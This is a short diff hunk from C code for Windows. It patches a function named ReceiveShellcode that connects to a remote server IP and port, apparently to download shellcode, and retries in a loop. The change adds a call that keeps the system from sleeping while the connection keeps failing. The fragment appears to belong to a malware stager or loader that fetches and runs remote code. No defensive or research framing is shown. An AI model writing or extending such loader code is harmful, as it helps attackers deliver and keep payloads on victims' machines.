@@ -131,6 +131,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 		serverAddr.sin_addr.s_addr = inet_addr(serverIP);
 		if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
 			closesocket(clientSocket);
+			SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
 			continue;
 		}
 
